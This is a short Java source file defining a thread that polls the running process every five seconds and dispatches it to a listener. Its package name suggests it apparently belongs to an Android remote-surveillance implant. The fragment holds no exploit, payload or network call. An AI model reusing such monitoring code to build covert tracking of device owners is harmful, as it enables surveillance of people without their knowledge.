package com.ht.RCSAndroidGUI.listener;

import com.ht.RCSAndroidGUI.RunningProcess;

public class BroadcastMonitorProcess extends Thread {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorProcess";

	private boolean stop;
	private int period;

	public BroadcastMonitorProcess() {
		stop = false;
		period = 5000; // Poll interval
	}

	synchronized public void run() {
		do {
			if (stop) {
				return;
			}

			RunningProcess p = RunningProcess.self();
			
			onReceive(p);

			try {
				wait(period);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		} while (true);
	}

	public void onReceive(RunningProcess p) {	
		ListenerProcess.self().dispatch(p);
	}

	void register() {
		stop = false;
	}

	synchronized void unregister() {
		stop = true;
		notify();
	}
}
